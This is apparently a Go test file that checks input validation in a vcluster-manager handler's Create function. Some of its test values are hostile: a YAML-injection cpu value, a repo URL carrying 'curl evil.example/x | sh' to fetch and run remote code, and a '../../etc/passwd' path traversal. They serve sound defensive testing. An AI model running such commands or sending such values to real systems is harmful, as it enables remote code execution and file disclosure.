package handlers

import (
	"io"
	"net/http"
	"net/http/httptest"
	"net/url"
	"strings"
	"testing"

	"github.com/gmalfray/vcluster-manager/internal/config"
)

// createTestHandlers is minimalHandlers plus a config, enough to reach the
// field validation in Create() without wiring GitLab/parser — validation
// must reject bad input before either is touched.
func createTestHandlers() *Handlers {
	h := minimalHandlers()
	h.cfg = &config.Config{}
	return h
}

// adminFormRequest builds an authenticated POST with an
// application/x-www-form-urlencoded body, the shape Create/UpdateSettings expect.
func adminFormRequest(target string, form url.Values) *http.Request {
	r := adminRequest(http.MethodPost, target)
	body := form.Encode()
	r.Body = io.NopCloser(strings.NewReader(body))
	r.ContentLength = int64(len(body))
	r.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	return r
}

func TestCreate_RejectsInvalidName(t *testing.T) {
	h := createTestHandlers()
	w := httptest.NewRecorder()
	form := url.Values{"name": {"Not_Valid!"}}
	r := adminFormRequest("/vclusters", form)

	h.Create(w, r)

	if got := w.Body.String(); !strings.Contains(got, "Nom invalide") {
		t.Errorf("expected the invalid-name toast, got %q", got)
	}
}

func TestCreate_RejectsMaliciousCPU(t *testing.T) {
	h := createTestHandlers()
	w := httptest.NewRecorder()
	form := url.Values{
		"name": {"demo"},
		"cpu":  {"8\n  evil: true"},
	}
	r := adminFormRequest("/vclusters", form)

	h.Create(w, r)

	if got := w.Body.String(); !strings.Contains(got, "cpu :") {
		t.Errorf("expected a cpu validation toast, got %q", got)
	}
}

func TestCreate_RejectsShellInjectionInFluxRepoURL(t *testing.T) {
	h := createTestHandlers()
	w := httptest.NewRecorder()
	form := url.Values{
		"name":            {"demo"},
		"fluxcd_repo_url": {"ssh://git@host/repo.git && curl evil.example/x | sh"},
	}
	r := adminFormRequest("/vclusters", form)

	h.Create(w, r)

	if got := w.Body.String(); !strings.Contains(got, "fluxcd_repo_url :") {
		t.Errorf("expected a fluxcd_repo_url validation toast, got %q", got)
	}
}

func TestCreate_RejectsPathTraversalInFluxCDPath(t *testing.T) {
	h := createTestHandlers()
	w := httptest.NewRecorder()
	form := url.Values{
		"name":        {"demo"},
		"fluxcd_path": {"../../etc/passwd"},
	}
	r := adminFormRequest("/vclusters", form)

	h.Create(w, r)

	if got := w.Body.String(); !strings.Contains(got, "fluxcd_path :") {
		t.Errorf("expected a fluxcd_path validation toast, got %q", got)
	}
}

func TestCreate_ValidInputPassesFieldValidation(t *testing.T) {
	// A well-formed request should sail past field validation and reach the
	// name-uniqueness check, which panics on a nil parser — proof that
	// validation itself accepted the input rather than rejecting it.
	h := createTestHandlers()
	w := httptest.NewRecorder()
	form := url.Values{
		"name":            {"demo"},
		"cpu":             {"8"},
		"memory":          {"32Gi"},
		"storage":         {"500Gi"},
		"fluxcd_repo_url": {"ssh://git@gitlab.example.com:22226/ops/fluxprod.git"},
		"fluxcd_branch":   {"main"},
		"fluxcd_path":     {"clusters/preprod"},
		"velero_hour":     {"03:00"},
	}
	r := adminFormRequest("/vclusters", form)

	defer func() {
		if recover() == nil {
			t.Fatal("expected Create to panic reaching the nil parser, meaning validation let valid input through")
		}
	}()
	h.Create(w, r)
}
